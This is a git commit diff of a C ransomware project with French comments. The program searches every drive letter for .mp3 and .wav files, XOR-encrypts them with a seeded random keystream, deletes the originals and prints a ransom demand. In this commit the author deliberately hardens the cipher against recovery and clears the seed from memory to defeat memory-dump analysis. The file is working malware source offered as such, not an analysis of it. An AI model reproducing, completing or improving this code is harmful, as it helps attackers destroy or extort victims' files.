c86673781a6c93476c66a6dc6a4e6721c024c318
Qtty <lyes.mouloudi.007@gmail.com>
2019-10-20 19:48:41 +0100

    Added a profile page and Updated the cipher in the ransomware

--- Projects/C/Crypto_ransomware/ListesChaines.h
+++ Projects/C/Crypto_ransomware/ListesChaines.h
@@ -7,62 +7,69 @@ typedef  struct Element {
 	struct Element* Suivant;
 			} Element;
 
-void InsertElt(Element** ListElts,char Path[1000])	{
+void InsertElt(Element** ListElts,char Path[1000])
+{
 
-Element* nouveau = malloc(sizeof(Element));
-Element* tete = *ListElts;
-Element* prec;
-strcpy(nouveau->path,Path);
-// nouveau->path= strdup(Path);
-nouveau->Suivant = NULL;
+	Element* nouveau = malloc(sizeof(Element));
+	Element* tete = *ListElts;
+	Element* prec;
+	strcpy(nouveau->path,Path);
+	// nouveau->path= strdup(Path);
+	nouveau->Suivant = NULL;
 
-if (tete == NULL ) *ListElts = nouveau ;
-else {	while (tete != NULL) {
-	prec = tete;
-	tete = tete->Suivant;
-				}
-	prec->Suivant = nouveau;
+	if (tete == NULL ) *ListElts = nouveau ;
+	else {	while (tete != NULL) {
+		prec = tete;
+		tete = tete->Suivant;
+					}
+		prec->Suivant = nouveau;
 
-      }
-			//printf("\nchemin%s\n",Path);
-						}
+		}
+				//printf("\nchemin%s\n",Path);
+}
 
 int RechercheElt(Element* ListElts , char Path[100])	{
 
-Element* tete = ListElts;
+	Element* tete = ListElts;
 
-		while(tete != NULL)	{
+	while(tete != NULL)
+	{
 		if (!strcmp(tete->path,Path)) return 1;
 		else tete = tete->Suivant;
-					}
-		return 0;
+	}
+	return 0;
 
-							}
+}
+
 
 void AffichageElts(Element* ListElts) 		{
 
-int i=1;
-Element* tete = ListElts;
+	int i=1;
+	Element* tete = ListElts;
 
 	if (tete == NULL) printf("La liste est vide .\n");
-	else {  while(tete != NULL)     {
-		printf("Element %d : \nPath %s\n\n",i,tete->path);
-		i++;
-		tete = tete->Suivant ;	}
-	     }
-						}
+	else {
+		while(tete != NULL)     {
+			printf("Element %d : \nPath %s\n\n",i,tete->path);
+			i++;
+			tete = tete->Suivant ;
+		}
+	}
+}
 
-void SuppElts(Element* ListElts) 		{
+void SuppElts(Element* ListElts) {
 
-int i=1;
-Element* tete = ListElts;
+	int i=1;
+	Element* tete = ListElts;
 
 	if (tete == NULL) printf("La liste est vide .\n");
-	else {  while(tete != NULL)     {
-		remove(tete->path);
-		tete = tete->Suivant ;	}
-	     }
-						}
+	else {  
+		while(tete != NULL) {
+			remove(tete->path);
+			tete = tete->Suivant ;	
+		}
+	}
+}
 
 /*int getType(Element* ListElts,char *Path){
 Element* tete = ListElts;
--- Projects/C/Crypto_ransomware/main.c
+++ Projects/C/Crypto_ransomware/main.c
@@ -16,15 +16,15 @@
 #include "ListesChaines.h"
 #include <windows.h>
 #define _WIN32_WINNT 0x0500
+#define MAX_FILENAME_LENGTH 5000
 
 
-void strcut(char entre[5000],char sortie[5000]){
+void strcut(char entre[MAX_FILENAME_LENGTH],char sortie[MAX_FILENAME_LENGTH]){
     int i;
-for(i=0;i<strlen(entre)-4;i++ ){
-
-    sortie[i]=entre[i];
-}
-sortie[i]='\0';
+	for(i=0;i<strlen(entre)-4;i++ ){
+    	sortie[i]=entre[i];
+	}
+	sortie[i]='\0';
 }
 
 
@@ -47,54 +47,53 @@ int isDIR( char* name)
 
     return -1;
 }
- int  list_dir(char* argv1, Element** Tete)
+
+int  list_dir(char* argv1, Element** Tete)
 {
-  //Element* tete=*Tete;
-DIR *dir;
-struct dirent *p;
-char fic[5000]="";
-char fic1[5000];
-char fic3[5000]="";
+	//Element* tete=*Tete;
+	DIR *dir;
+	struct dirent *p;
+	char fic[MAX_FILENAME_LENGTH]="",fic1[MAX_FILENAME_LENGTH],fic3[MAX_FILENAME_LENGTH];
 
-//printf("le repertoir est : %s\n",argv1);
-dir=opendir(argv1);
+	//printf("le repertoir est : %s\n",argv1);
+	dir = opendir(argv1);
 
-while((p = readdir(dir))!=NULL)
-{
-    strcpy(fic1,argv1);
-  //  printf("ani dkhalt\n");
-      strcpy(fic,p->d_name);
-     // printf("\t%s\n",fic);
+	while((p = readdir(dir))!=NULL)
+	{
+		strcpy(fic1,argv1);
+	//  printf("ani dkhalt\n");
+		strcpy(fic,p->d_name);
+		// printf("\t%s\n",fic);
 
-   if (strcmpi(p->d_name,".")==0 || strcmpi(p->d_name,"..")==0) {int t=0;}//printf("hihi\n")
-   else{
+	if (strcmpi(p->d_name,".")==0 || strcmpi(p->d_name,"..")==0) {int t=0;}//printf("hihi\n")
+	else{
 
-      //  printf("%s fiq \n",fic1);
-      //  printf("%s\n",fic);
-        strcat(fic1,"/");
-        strcat(fic1,fic);
-     //   printf("%s \n",fic1);
-      //  printf("ok\n");
-       if (isDIR(fic1)==1){
-      //  printf(" Nom fichier :%s \n", fic1);
-        if(((strlen(fic1)> 3) && (fic1[strlen(fic1)-1]=='3') && (fic1[strlen(fic1)-2]='p') && (fic1[strlen(fic1)-3]='m'))
-            || ((strlen(fic1)> 3) && (fic1[strlen(fic1)-1]=='v') && (fic1[strlen(fic1)-2]='a') && (fic1[strlen(fic1)-3]='w')))
-                        {
-        InsertElt(Tete,fic1);}
-        strcpy(fic1,"");
+		//  printf("%s fiq \n",fic1);
+		//  printf("%s\n",fic);
+			strcat(fic1,"/");
+			strcat(fic1,fic);
+		//   printf("%s \n",fic1);
+		//  printf("ok\n");
+		if (isDIR(fic1)==1){
+		//  printf(" Nom fichier :%s \n", fic1);
+			if(((strlen(fic1)> 3) && (fic1[strlen(fic1)-1]=='3') && (fic1[strlen(fic1)-2]='p') && (fic1[strlen(fic1)-3]='m'))
+				|| ((strlen(fic1)> 3) && (fic1[strlen(fic1)-1]=='v') && (fic1[strlen(fic1)-2]='a') && (fic1[strlen(fic1)-3]='w')))
+							{
+			InsertElt(Tete,fic1);}
+			strcpy(fic1,"");
 
-        }
-        else if (isDIR(fic1)==0)
-            {
-    list_dir(fic1,Tete);
-        }
-        }
+			}
+			else if (isDIR(fic1)==0)
+				{
+		list_dir(fic1,Tete);
+			}
+			}
 
+	}
+	closedir(dir);
+	return 0;
 }
-closedir(dir);
-return 0;
-}
-//----------------------renaùe
+//----------------------renaï¿½e
 #include<stdio.h>
 
 int renommer(Element* Tete)
@@ -120,18 +119,20 @@ int renommer(Element* Tete)
 }
 
 //---------------------cryptage----------------------
-void CryptageFichiersOuverts(FILE *pfIn, FILE *pfOut, int clef)
+void CryptageFichiersOuverts(FILE *pfIn, FILE *pfOut)
 {
 	int carac;
+	int clef;
 	while((carac = fgetc(pfIn)) != EOF)
 	{
+		clef = rand() % 256;
 		int xored = carac ^ clef;
 		fputc(xored, pfOut);
 	}
 
 }
 
-void Cryptage(const char nomFichSrc[5000], const char *nomFichDest, int clef)
+void Cryptage(const char nomFichSrc[MAX_FILENAME_LENGTH], const char *nomFichDest)
 {
 	FILE *pfIn = fopen(nomFichSrc, "r");
 	if(pfIn == NULL)
@@ -149,7 +150,7 @@ void Cryptage(const char nomFichSrc[5000], const char *nomFichDest, int clef)
 		}
 		else
 		{
-			CryptageFichiersOuverts(pfIn, pfOut, clef);
+			CryptageFichiersOuverts(pfIn, pfOut);
 			fclose(pfOut);
 		}
 
@@ -158,30 +159,27 @@ void Cryptage(const char nomFichSrc[5000], const char *nomFichDest, int clef)
 
 }
 
-void DemandeEtCrypte(char nomFich[5000])
+void DemandeEtCrypte(char nomFich[MAX_FILENAME_LENGTH])
 {
 	//char nomFich[300] = "";
 	char *pRetour = NULL;
-	int clef =10000000;
-	clef=clef+(rand()%100000000);
 
 	//int clef=12345678; // hadi na9adrouha ndirouha plus tard random ( ngeneriw 2 random numbers num wahad comme id w num
 	                   // wahdokher comme mot de passe .... ncrypter b le mot de passe w nab3at lya id + mdp apres nweri la
 	                   // victime ghir id bach na9der nrecupiri pour chaque victime son mdp
 
 	//printf("Nom du fichier a crypter : %s\n",nomFich);
-	char nomcry[5000];
+	char nomcry[MAX_FILENAME_LENGTH];
 	//strcpy(nomcry,nomFich);
 	strcut(nomFich,nomcry);
-	if(nomFich[strlen(nomFich)-1]=='3')
-	strcat(nomcry,"CRYPTED.mp3");
-        else strcat(nomcry,"CRYPTED.wav");
-	//fflush(stdout); // Nécessaire si une ligne ne se termine pas par \n - fflush(stdout) : fonction qui vide le tampon de sortie.
+	if(nomFich[strlen(nomFich)-1]=='3') strcat(nomcry,"CRYPTED.mp3");
+    else strcat(nomcry,"CRYPTED.wav");
+	//fflush(stdout); // Nï¿½cessaire si une ligne ne se termine pas par \n - fflush(stdout) : fonction qui vide le tampon de sortie.
 
 	/* On lit le nom du fichier,
-	   puis on vérifie qu'il rentre en entier dans la zone de 300 caractères.
+	   puis on vï¿½rifie qu'il rentre en entier dans la zone de 300 caractï¿½res.
 	   S'il rentre, le \n sera dedans, et il faudra le supprimer.
-	   Si ça ne rentre pas, le \n ne sera pas dedans, et on dira Erreur. */
+	   Si ï¿½a ne rentre pas, le \n ne sera pas dedans, et on dira Erreur. */
 
 	//fgets(nomFich, 300, stdin);
 	//pRetour = strchr(nomFich, '\n');
@@ -192,88 +190,99 @@ void DemandeEtCrypte(char nomFich[5000])
 	}
 	else
 	{
-		// Le \n est présent : OK, on tronque la chaîne ici.
+		// Le \n est prï¿½sent : OK, on tronque la chaï¿½ne ici.
 		*pRetour = '\0';*/
 
 
 
-		Cryptage(nomFich, nomcry, clef);
-		printf ("fichier crypté\n");
+		Cryptage(nomFich, nomcry);
+		printf ("fichier cryptï¿½\n");
 		//}
 }
 
 
 
 
-//
+/*
+the encryption key now is the seed,before this,
+the key was weak and repeated,a simple
+repeated key xor attack can reveal all the 
+plaintext
+but since the key is the seed now,the cipher became
+an OTP(one time pad) and all you have to do is to recover
+the seed in order to decrypt the files
+*/
 int main(void)
 {
-    int ID=rand()%500;
-char* chC="C:/";
-char* chD="D:/";
-char* chE="E:/";
-char* chF="F:/";
-char* chG="G:/";
-char* chH="H:/";
-char* chI="I:/";
-char* chJ="J:/";
-char* chK="K:/";
-char* chL="L:/";
-char* chM="M:/";
-char* chN="N:/";
-char* chO="O:/";
-char* chP="P:/";
-char* chQ="Q:/";
-char* chR="R:/";
-char* chS="S:/";
-char* chT="T:/";
-char* chU="U:/";
-char* chV="V:/";
-char* chW="W:/";
-char* chX="X:/";
-char* chY="Y:/";
-char* chZ="Z:/";
-char* chA="A:/";
-char* chB="B:/";
-Element* Tete=NULL;
-int i=list_dir(chD,&Tete);
-i=list_dir(ch,&Tete);
-i=list_dir(chE,&Tete);
-i=list_dir(chF,&Tete);
-i=list_dir(chG,&Tete);
-i=list_dir(chH,&Tete);
-i=list_dir(chI,&Tete);
-i=list_dir(chJ,&Tete);
-i=list_dir(chK,&Tete);
-i=list_dir(chL,&Tete);
-i=list_dir(chM,&Tete);
-i=list_dir(chN,&Tete);
-i=list_dir(chO,&Tete);
-i=list_dir(chP,&Tete);
-i=list_dir(chQ,&Tete);
-i=list_dir(chR,&Tete);
-i=list_dir(chS,&Tete);
-i=list_dir(chT,&Tete);
-i=list_dir(chU,&Tete);
-i=list_dir(chV,&Tete);
-i=list_dir(chW,&Tete);
-i=list_dir(chX,&Tete);
-i=list_dir(chY,&Tete);
-i=list_dir(chZ,&Tete);
-i=list_dir(chA,&Tete);
-i=list_dir(chB,&Tete);
-//printf("\n\n\n--------------------------------------------------------------------");
-//AffichageElts(Tete);
-Element* p=Tete;
-while(p!=NULL){
-    DemandeEtCrypte(p->path);
-    p=p->Suivant;
-}
-SuppElts(Tete);
-//renommer(Tete);
-printf("----------------------------------------------------------------------------------\n");
-printf("You have been hacked you need to pay a ransom ......\n");
-printf("----------------------------------------------------------------------------------\n");
+	long seed = 215489151;//random seed that can be hard coded or 
+    int ID = rand() % 500;
+	char* chC="C:/";
+	char* chD="D:/";
+	char* chE="E:/";
+	char* chF="F:/";
+	char* chG="G:/";
+	char* chH="H:/";
+	char* chI="I:/";
+	char* chJ="J:/";
+	char* chK="K:/";
+	char* chL="L:/";
+	char* chM="M:/";
+	char* chN="N:/";
+	char* chO="O:/";
+	char* chP="P:/";
+	char* chQ="Q:/";
+	char* chR="R:/";
+	char* chS="S:/";
+	char* chT="T:/";
+	char* chU="U:/";
+	char* chV="V:/";
+	char* chW="W:/";
+	char* chX="X:/";
+	char* chY="Y:/";
+	char* chZ="Z:/";
+	char* chA="A:/";
+	char* chB="B:/";
+	Element* Tete=NULL;
+	int i=list_dir(chD,&Tete);
+	i=list_dir(chC,&Tete);
+	i=list_dir(chE,&Tete);
+	i=list_dir(chF,&Tete);
+	i=list_dir(chG,&Tete);
+	i=list_dir(chH,&Tete);
+	i=list_dir(chI,&Tete);
+	i=list_dir(chJ,&Tete);
+	i=list_dir(chK,&Tete);
+	i=list_dir(chL,&Tete);
+	i=list_dir(chM,&Tete);
+	i=list_dir(chN,&Tete);
+	i=list_dir(chO,&Tete);
+	i=list_dir(chP,&Tete);
+	i=list_dir(chQ,&Tete);
+	i=list_dir(chR,&Tete);
+	i=list_dir(chS,&Tete);
+	i=list_dir(chT,&Tete);
+	i=list_dir(chU,&Tete);
+	i=list_dir(chV,&Tete);
+	i=list_dir(chW,&Tete);
+	i=list_dir(chX,&Tete);
+	i=list_dir(chY,&Tete);
+	i=list_dir(chZ,&Tete);
+	i=list_dir(chA,&Tete);
+	i=list_dir(chB,&Tete);
+	//printf("\n\n\n--------------------------------------------------------------------");
+	//AffichageElts(Tete);
+	srand(seed);
+	Element* p=Tete;
+	while(p!=NULL){
+		DemandeEtCrypte(p->path);
+		p=p->Suivant;
+	}
+	SuppElts(Tete);
+	//renommer(Tete);
+	printf("----------------------------------------------------------------------------------\n");
+	printf("You have been hacked you need to pay a ransom ......\n");
+	printf("----------------------------------------------------------------------------------\n");
+	seed = 0;//to remove the seed from the memory in case the victim tries a memory dump to extract it
 
 }
 
